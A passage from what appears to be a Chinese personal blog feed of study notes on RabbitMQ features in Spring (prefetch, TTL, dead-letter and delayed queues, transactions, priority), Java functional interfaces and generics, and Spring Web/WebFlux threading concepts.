id="2-2-2-实现削峰限流"><a href="#2-2-2-实现削峰限流" class="headerlink" title="2.2.2. 实现削峰限流"></a>2.2.2. 实现削峰限流</h5><p>假设队列中有一万条数据，我们可以设置消费端每次最多从队列中取回 1000 条数据。设置起来也很简单，只需在配置中调整一个参数：<code>prefetch</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">application:</span>  <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">RabbitMQ</span>  <br>  <span class="hljs-attr">rabbitmq:</span>  <br>    <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.7</span>  <br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span>  <br>    <span class="hljs-attr">username:</span> <span class="hljs-string">guest</span>  <br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>  <br>    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span>  <br>    <span class="hljs-attr">listener:</span>  <br>      <span class="hljs-attr">simple:</span>  <br>        <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">manual</span>  <br>        <span class="hljs-attr">prefetch:</span> <span class="hljs-number">1000</span>    <span class="hljs-comment"># 每次最多从消息队列取回 1000 条数据</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-3-消息超时"><a href="#2-3-消息超时" class="headerlink" title="2.3. 消息超时"></a>2.3. 消息超时</h4><h5 id="2-3-1-消息超时概述"><a href="#2-3-1-消息超时概述" class="headerlink" title="2.3.1. 消息超时概述"></a>2.3.1. 消息超时概述</h5><p>消息一直没被取走也不能一直留在消息队列中，我们给消息设定一个过期时间，超过这个时间没有被取走的消息就会被删除，我们可以从两个层面来给消息设定过期时间：</p><ol><li>&#x3D;&#x3D;队列层面&#x3D;&#x3D;：<ol><li>在队列级别设置统一的过期时间，该队列中所有消息都会使用相同的过期时间。</li></ol></li><li>&#x3D;&#x3D;消息层面&#x3D;&#x3D;：<ol><li>发送消息时，为某一条消息单独指定过期时间</li></ol></li><li>需要注意的是：如果两个层面都设置了过期时间，以较短的那个时间为准，优先生效。</li></ol><hr><h5 id="2-3-2-队列层面设置"><a href="#2-3-2-队列层面设置" class="headerlink" title="2.3.2. 队列层面设置"></a>2.3.2. 队列层面设置</h5><p><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250510221058008.png"></p><hr><h5 id="2-3-3-Java-代码进行消息层面设置"><a href="#2-3-3-Java-代码进行消息层面设置" class="headerlink" title="2.3.3. Java 代码进行消息层面设置"></a>2.3.3. Java 代码进行消息层面设置</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQProduce</span> &#123;  <br><br>    <span class="hljs-comment">// 交换机  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_DIRECT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test.exchange&quot;</span>;  <br>    <br>    <span class="hljs-comment">// 路由键  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test&quot;</span>;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage&quot;)</span>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sendMessage</span><span class="hljs-params">()</span> &#123;  <br>        rabbitTemplate.convertAndSend(  <br>                EXCHANGE_DIRECT,  <br>                ROUTING_KEY,  <br>                <span class="hljs-string">&quot;first sent message!&quot;</span>,  <br>                message -&gt; &#123;  <br>                    <span class="hljs-comment">// 消息层面设置超时时间，以毫秒为单位  </span><br>                    message.getMessageProperties().setExpiration(<span class="hljs-string">&quot;7000&quot;</span>);  <br>                    message.getMessageProperties().setPriority(<span class="hljs-number">4</span>);  <br>                    message.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT);  <br>  <br>                    <span class="hljs-keyword">return</span> message;  <br>                &#125;,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;123456&quot;</span>)  <br>        );  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;发送成功&quot;</span>;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="2-4-死信处理"><a href="#2-4-死信处理" class="headerlink" title="2.4. 死信处理"></a>2.4. 死信处理</h4><h5 id="2-4-1-死信概述"><a href="#2-4-1-死信概述" class="headerlink" title="2.4.1. 死信概述"></a>2.4.1. 死信概述</h5><p>上文说 “我们给消息设定一个过期时间，超过这个时间没有被取走的消息就会被删除” 其实不太准确，应该是 “超过这个时间没有被取走的消息就会成为死信，默认被抛弃”</p><p>死信产生的原因：</p><ol><li>&#x3D;&#x3D;拒绝投递&#x3D;&#x3D;：<ol><li>消费者显式拒绝消息（调用 <code>basicReject()</code> 或 <code>basicNack()</code>），并且设置 <code>requeue=false</code>，表示不重新投回原队列，消息因此被丢弃为死信。</li></ol></li><li>&#x3D;&#x3D;队列溢出&#x3D;&#x3D;：<ol><li>队列达到最大容量限制。例如一个队列最多只能容纳 10 条消息，当已有 10 条消息时再投递新消息，会导致最早的一条消息被挤出，成为死信（遵循先进先出原则）</li></ol></li><li>&#x3D;&#x3D;超时未消费&#x3D;&#x3D;：<ol><li>消息设置了过期时间，如果在指定时间内没有被消费，就会过期，变为死信。</li></ol></li></ol><p>死信常见处理方式：</p><ol><li>&#x3D;&#x3D;直接丢弃（默认）&#x3D;&#x3D;：<ol><li>适用于业务上不重要的消息，无需额外处理。</li></ol></li><li>&#x3D;&#x3D;入库保存&#x3D;&#x3D;：<ol><li>将死信记录入数据库，便于后续人工或定时任务处理。</li></ol></li><li>&#x3D;&#x3D;死信进入死信队列（推荐）&#x3D;&#x3D;：<ol><li>配置死信队列（DLX）并由消费者监听，专门对死信消息进行分析和补偿处理，是较常用的做法。</li></ol></li></ol><hr><h5 id="2-4-2-死信进入死信队列"><a href="#2-4-2-死信进入死信队列" class="headerlink" title="2.4.2. 死信进入死信队列"></a>2.4.2. 死信进入死信队列</h5><h6 id="2-4-2-1-创建死信交换机、死信队列，将两者绑定"><a href="#2-4-2-1-创建死信交换机、死信队列，将两者绑定" class="headerlink" title="2.4.2.1. 创建死信交换机、死信队列，将两者绑定"></a>2.4.2.1. 创建死信交换机、死信队列，将两者绑定</h6><p>死信交换机名称为：<code>test.dlx.exchange</code>，死信队列名称为：<code>test.dlx.queue</code>，路由键为 <code>test</code></p><hr><h6 id="2-4-2-2-创建主交换机、主队列，将两者绑定"><a href="#2-4-2-2-创建主交换机、主队列，将两者绑定" class="headerlink" title="2.4.2.2. 创建主交换机、主队列，将两者绑定"></a>2.4.2.2. 创建主交换机、主队列，将两者绑定</h6><p>主交换机名称为：<code>test.exchange</code>。队列限制较多，详细看图，名称为：<code>test.queue</code>。路由键为：<code>test</code></p><p><img src="/PixPin_2025-05-12_09-16-53%201.png"></p><hr><h6 id="2-4-2-3-编写死信队列消费者代码"><a href="#2-4-2-3-编写死信队列消费者代码" class="headerlink" title="2.4.2.3. 编写死信队列消费者代码"></a>2.4.2.3. 编写死信队列消费者代码</h6><p>根据业务需求自己发挥</p><hr><h4 id="2-5-延迟队列"><a href="#2-5-延迟队列" class="headerlink" title="2.5. 延迟队列"></a>2.5. 延迟队列</h4><h5 id="2-5-1-延迟队列概述"><a href="#2-5-1-延迟队列概述" class="headerlink" title="2.5.1. 延迟队列概述"></a>2.5.1. 延迟队列概述</h5><p>类似于电商网站中的提示：“订单已提交，请在 23 时 59 分 47 秒内完成支付”，我们希望在订单创建后<strong>延迟 24 小时</strong>再进行未支付订单的关闭处理。</p><p>我们的解决思路有以下两种：</p><ol><li>&#x3D;&#x3D;消息超时 + 死信队列&#x3D;&#x3D;：<ol><li>将消息发送到一个设置了 TTL（过期时间）的普通队列，不对该队列进行消费。</li><li>当消息在队列中存满 24 小时后未被消费，它会自动过期并被转发到 死信队列（DLQ）</li><li>我们只监听死信队列，待消息进入后再触发订单关闭逻辑</li></ol></li><li>&#x3D;&#x3D;使用 RabbitMQ 延迟消息插件（推荐）&#x3D;&#x3D;<ol><li>借助 RabbitMQ 的 <strong>延迟队列插件</strong>（<code>rabbitmq-delayed-message-exchange</code>），可精确控制消息的延迟时间；</li><li>注意事项：该插件支持的最大延迟时间为 两天（48 小时）</li></ol></li></ol><hr><h5 id="2-5-2-使用-RabbitMQ-延迟消息插件"><a href="#2-5-2-使用-RabbitMQ-延迟消息插件" class="headerlink" title="2.5.2. 使用 RabbitMQ 延迟消息插件"></a>2.5.2. 使用 RabbitMQ 延迟消息插件</h5><p>回来看35级，如何在手动安装的情况下安装插件<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511103811397.png"></p><p>队列就正常建就行<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511104005312.png"></p><p>然后是消费者<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511104106123.png"><br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511104123191.png"></p><p><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511104218010.png"></p><hr><h4 id="2-6-事务消息"><a href="#2-6-事务消息" class="headerlink" title="2.6. 事务消息"></a>2.6. 事务消息</h4><h5 id="2-6-1-事务消息概述"><a href="#2-6-1-事务消息概述" class="headerlink" title="2.6.1. 事务消息概述"></a>2.6.1. 事务消息概述</h5><p>所谓的事务消息，其实并不是多牛的分布式事务，而是 Java 自己在本地搞的小动作：先把消息留在内存里，等你整个流程都 OK 了才发出去；要是中间出事了，干脆就不发了直接回滚。不过要注意，哪怕发出去了，也不一定真到交换机或者队列里。所以说到底，这套事务控制是“应用层面自娱自乐”，别指望它替你搞定消息可靠投递那一套。<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250512165603672.png"></p><hr><h5 id="2-6-2-创建-RabbitMQ-事务模式配置类，并配置事务消息"><a href="#2-6-2-创建-RabbitMQ-事务模式配置类，并配置事务消息" class="headerlink" title="2.6.2. 创建 RabbitMQ 事务模式配置类，并配置事务消息"></a>2.6.2. 创建 RabbitMQ 事务模式配置类，并配置事务消息</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitTransactionConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> RabbitTransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">(CachingConnectionFactory connectionFactory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RabbitTransactionManager</span>(connectionFactory);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> RabbitTemplate <span class="hljs-title function_">rabbitTemplate</span><span class="hljs-params">(CachingConnectionFactory connectionFactory)</span> &#123;<br>        <span class="hljs-type">RabbitTemplate</span> <span class="hljs-variable">rabbitTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RabbitTemplate</span>(connectionFactory);<br>        rabbitTemplate.setChannelTransacted(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> rabbitTemplate;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-6-3-编写生产者代码时，标注-Transactional"><a href="#2-6-3-编写生产者代码时，标注-Transactional" class="headerlink" title="2.6.3. 编写生产者代码时，标注 @Transactional"></a>2.6.3. 编写生产者代码时，标注 @Transactional</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@Transactional</span> <span class="hljs-comment">// 使用 Spring 提供的事务管理，开启事务消息（MyBatis 中涉及）  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQProduce</span> &#123;  <br><br>    <span class="hljs-comment">// 交换机  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_DIRECT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;exchange.direct.test&quot;</span>;  <br>    <br>    <span class="hljs-comment">// 路由键  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test&quot;</span>;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@GetMapping(&quot;sendMessage&quot;)</span>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sendMessage</span><span class="hljs-params">()</span> &#123;  <br>        rabbitTemplate.convertAndSend(EXCHANGE_DIRECT, ROUTING_KEY, <span class="hljs-string">&quot;first sent message!&quot;</span>);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;发送成功&quot;</span>;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="2-7-优先消息"><a href="#2-7-优先消息" class="headerlink" title="2.7. 优先消息"></a>2.7. 优先消息</h4><h5 id="2-7-1-优先消息概述"><a href="#2-7-1-优先消息概述" class="headerlink" title="2.7.1. 优先消息概述"></a>2.7.1. 优先消息概述</h5><p>默认情况下，队列遵循先进先出（FIFO）原则，先入队的消息优先被投递；但当我们为消息设置了优先级后，优先级较高的消息将优先于低优先级消息进行投递。</p><hr><h5 id="2-7-2-创建主交换机、主队列，将两者绑定"><a href="#2-7-2-创建主交换机、主队列，将两者绑定" class="headerlink" title="2.7.2. 创建主交换机、主队列，将两者绑定"></a>2.7.2. 创建主交换机、主队列，将两者绑定</h5><p>主交换机名称为：<code>test.exchange</code>。主队列需要用 <code>x-max-priority</code> 指定队列中消息最高的优先级，名称为：<code>test.queue</code>。路由键为：<code>test</code><br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250512170407701.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>消息优先级取值范围为：1 ~ 255</li><li>RabbitMQ 官方建议在 1 ~ 5 之间取值，因为优先级越高，占用 CPU、内存等资源越多</li></ol></blockquote><hr><h5 id="2-7-3-Java-代码指定消息优先级"><a href="#2-7-3-Java-代码指定消息优先级" class="headerlink" title="2.7.3. Java 代码指定消息优先级"></a>2.7.3. Java 代码指定消息优先级</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQProduce</span> &#123;  <br>    <span class="hljs-comment">// 交换机  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_DIRECT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test.exchange&quot;</span>;  <br>    <span class="hljs-comment">// 路由键  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test&quot;</span>;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage&quot;)</span>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sendMessage</span><span class="hljs-params">()</span> &#123;  <br>        rabbitTemplate.convertAndSend(  <br>                EXCHANGE_DIRECT,  <br>                ROUTING_KEY,  <br>                <span class="hljs-string">&quot;first sent message!&quot;</span>,  <br>                message -&gt; &#123;  <br>                    <span class="hljs-comment">// 指定消息优先级，不得超过 x-max-priority                    message.getMessageProperties().setPriority(4);  </span><br>                    message.getMessageProperties().setExpiration(<span class="hljs-string">&quot;7000&quot;</span>);  <br>                    message.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT);  <br>  <br>                    <span class="hljs-keyword">return</span> message;  <br>                &#125;,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;123456&quot;</span>)  <br>        );  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;发送成功&quot;</span>;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>消息队列</category>
      
      <category>RabbitMQ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java SE</title>
    <link href="/2025/05/07/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20SE/"/>
    <url>/2025/05/07/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20SE/</url>
    
    <content type="html"><![CDATA[<h3 id="0、导图：Map：Java-SE"><a href="#0、导图：Map：Java-SE" class="headerlink" title="0、导图：Map：Java SE"></a>0、导图：<a href="../../maps/Map%EF%BC%9AJavaSE.xmind">Map：Java SE</a></h3><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/ava%20SE/image-20250703093849042.png"></p><p>无线循环，while(true)<br>\</p><h3 id="函数式接口，lambda-表达式："><a href="#函数式接口，lambda-表达式：" class="headerlink" title="函数式接口，lambda 表达式："></a>函数式接口，lambda 表达式：</h3><h3 id="4-函数狮子接口"><a href="#4-函数狮子接口" class="headerlink" title="4. 函数狮子接口"></a>4. 函数狮子接口</h3><p>这种一般都是让我们自己写逻辑，而不是那种给我们实现类的<br><img src="/image-20250510221406130.png"></p><p>lambde 表达式的口诀，复制小括号，</p><p><img src="/image-20250510221434222.png"></p><p>返回值<img src="/image-20250510221448648.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
      <category>Java SE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记 ：Java 泛型</title>
    <link href="/2025/05/06/%E7%AC%94%E8%AE%B0%20%EF%BC%9AJava%20%E6%B3%9B%E5%9E%8B/"/>
    <url>/2025/05/06/%E7%AC%94%E8%AE%B0%20%EF%BC%9AJava%20%E6%B3%9B%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h3 id="1-四大函数对比表"><a href="#1-四大函数对比表" class="headerlink" title="1. 四大函数对比表"></a>1. 四大函数对比表</h3><table><thead><tr><th>接口</th><th>方法签名</th><th>接收参数</th><th>返回值</th><th>可抛异常</th><th>用途描述</th></tr></thead><tbody><tr><td><code>Runnable</code></td><td><code>void run()</code></td><td>❌ 否</td><td>❌ 否</td><td>❌ 否</td><td>执行一个任务，不需要输入，也不返回</td></tr><tr><td><code>Callable&lt;R&gt;</code></td><td><code>T call()</code></td><td>❌ 否</td><td>✅ 是</td><td>✅ 是</td><td>执行一个任务，返回结果 R，可抛异常</td></tr><tr><td><code>Consumer&lt;T&gt;</code></td><td><code>void accept(T t)</code></td><td>✅ 是</td><td>❌ 否</td><td>❌ 否</td><td>消费一个输入值 T，不返回结果</td></tr><tr><td><code>Function&lt;T,R&gt;</code></td><td><code>R apply(T t)</code></td><td>✅ 是</td><td>✅ 是</td><td>❌ 否</td><td>把输入 T 转换成输出 R</td></tr></tbody></table><hr><h3 id="常见泛型"><a href="#常见泛型" class="headerlink" title="常见泛型"></a>常见泛型</h3><ol><li><code>mono.map(Function&lt;T, R&gt; mapper)</code>：<ol><li><code>Function</code>：<ol><li>Java 中的函数式接口（能接受参数，有返回值，不可抛异常的任务）</li></ol></li><li><code>T</code>：<ol><li>输入泛型占位符，代表任意一种输入类型。</li></ol></li><li><code>R</code>：<ol><li>输出泛型占位符，代表任意一种返回类型。</li></ol></li><li><code>mapper</code>：<ol><li>函数名，表示你传入的具体转换函数。</li></ol></li><li><code>Function&lt;T, R&gt; mapper</code>：<ol><li>名为 mapper 的函数接口，输入 T，返回 R。</li></ol></li></ol></li></ol><hr><ol start="2"><li><code>Mono.just(T data)</code>：<ol><li><code>data</code>：<ol><li>变量名，表示要包装进 Mono 的那个具体值。</li></ol></li><li><code>T data</code>：<ol><li>表示一个 T 类型的输入值</li></ol></li></ol></li></ol><hr><ol start="3"><li><code>mono.cast(Class&lt;R&gt; type)</code><ol><li><code>Class</code>：<ol><li>Java 关键字，用于获取某个类的 <code>Class</code> 对象。</li></ol></li><li><code>type</code>：<ol><li>变量名，表示目标类型的 <code>Class</code> 实例。</li></ol></li><li><code>Class&lt;R&gt; type</code>：<ol><li>表示 R 类型的运行时类型信息</li></ol></li></ol></li></ol><hr><ol start="4"><li><code>Mono.fromCallable(Callable&lt;R&gt;)</code> <ol><li><code>Callable</code>：<ol><li>Java 中的函数式接口（不能接受参数，无返回值，不可抛异常的任务）</li></ol></li><li><code>Callable&lt;R&gt;</code>：<ol><li>表示一个执行后返回 R 类型结果的任务</li></ol></li><li>与 <code>Runnable</code> 相对，该接口表示不能抛异常、不返回结果的任务</li></ol></li></ol><hr><ol start="5"><li><code>mono.flatMap(Function&lt;T, Mono&lt;R&gt;&gt; mapper)</code><ol><li><code>Function&lt;T, Mono&lt;R&gt;&gt;</code>：<ol><li>输入 T，返回 <code>Mono&lt;R&gt;</code> 的函数。</li></ol></li></ol></li></ol><hr><ol start="6"><li><code>mono.switchIfEmpty(Mono&lt;? extends T&gt; fallback)</code><ol><li><code>? extends T</code>：<ol><li>T 类型或 T 的子类型</li></ol></li></ol></li></ol><hr><ol start="7"><li><code>mono.onErrorResume(Function&lt;Throwable, Mono&lt;? extends T&gt;&gt; fallback)</code><ol><li><code>Throwable</code>：<ol><li><code>Throwable</code> 是 Java 中的所有异常和错误的根类，它分为两大类：<ol><li>**<code>Error</code>**：通常用于表示 JVM 内部的严重错误，如 <code>OutOfMemoryError</code>，这些一般不被捕获和处理。</li><li>**<code>Exception</code>**：表示程序中可以捕获和处理的异常。包括受检异常（如 <code>IOException</code>）和运行时异常（如 <code>NullPointerException</code>）。</li></ol></li><li>你可以把 <code>Throwable</code> 看作一个包含所有错误和异常的容器。</li></ol></li></ol></li></ol><hr><ol start="8"><li><code>map(Function&lt;? super T, ? extends R&gt; mapper)</code><ol><li><code>? super T</code><ol><li>表示「T 类型或 T 的<strong>父类型</strong>」。</li></ol></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
      <category>Java 泛型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Web</title>
    <link href="/2025/05/04/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Web/"/>
    <url>/2025/05/04/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Web/</url>
    
    <content type="html"><![CDATA[<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h3 id="主线程、异步线程分别应该执行哪些操作"><a href="#主线程、异步线程分别应该执行哪些操作" class="headerlink" title="主线程、异步线程分别应该执行哪些操作"></a>主线程、异步线程分别应该执行哪些操作</h3><ol><li>&#x3D;&#x3D;主线程应处理非耗时的小逻辑操作，确保应用响应迅速：&#x3D;&#x3D;<ol><li>字符串拼接</li><li>参数校验</li><li>数据封装</li><li>简单计算</li></ol></li><li>&#x3D;&#x3D;异步线程应处理那些耗时的、阻塞的操作，这些操作通常涉及等待外部资源或大量计算：&#x3D;&#x3D;<ol><li>阻塞的网络请求（HttpClient）<ol><li>如 HTTP 请求、API 调用等需要等待响应的操作</li></ol></li><li>阻塞的数据库查询（JDBC）</li><li>文件读写</li><li>CPU 密集型操作<ol><li>复杂运算</li><li>大规模数据处理<ol><li>压缩和解压、加密和解密、大型数据集处理</li></ol></li><li>媒体转码<ol><li>视频格式转换、音频格式转换</li></ol></li><li>等等等等</li></ol></li></ol></li></ol><h1 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h1><h3 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h3>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring WebFlux</title>
    <link href="/2025/05/03/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20WebFlux/"/>
    <url>/2025/05/03/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20WebFlux/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-Spring-WebFlux-概述"><a href="#1-Spring-WebFlux-概述" class="headerlink" title="1. Spring WebFlux 概述"></a>1. Spring WebFlux 概述</h3><p>&#x3D;&#x3D;1.现有问题&#x3D;&#x3D;<br>随着互联网应用的日益复杂和用户对实时性要求的提高，传统的基于<strong>阻塞 I&#x2F;O</strong> 的Web框架在处理高并发和大数据流时逐渐显现出瓶颈。</p><p>&#x3D;&#x3D;2.响应式编程解决方案&#x3D;&#x3D;<br>基于以上问题，响应式编程模型应运而生，响应式编程是一种<strong>处理异步数据流</strong>、<strong>变化传播</strong>、<strong>非阻塞</strong>的编程范式，在响应式编程中，数据被建模为流，操作以非阻塞方式执行，从而保持应用程序在高负载下的响应性。</p><p>&#x3D;&#x3D;3.Spring WebFlux 是什么&#x3D;&#x3D;<br>Spring WebFlux，作为 Spring Framework 的响应式Web框架，基于 Reactive Streams 规范构建，采用事件驱动 + 非阻塞 I&#x2F;O 的架构设计，特别适合处理高并发、低延迟和 I&#x2F;O 密集型任务。</p><hr><h3 id="深入理解传统-Spring-Web（Servlet-栈）"><a href="#深入理解传统-Spring-Web（Servlet-栈）" class="headerlink" title="深入理解传统 Spring Web（Servlet 栈）"></a>深入理解传统 Spring Web（Servlet 栈）</h3><p>Spring Web 采用传统的阻塞式编程模型，基于 Servlet API，默认使用 Servlet 容器（如 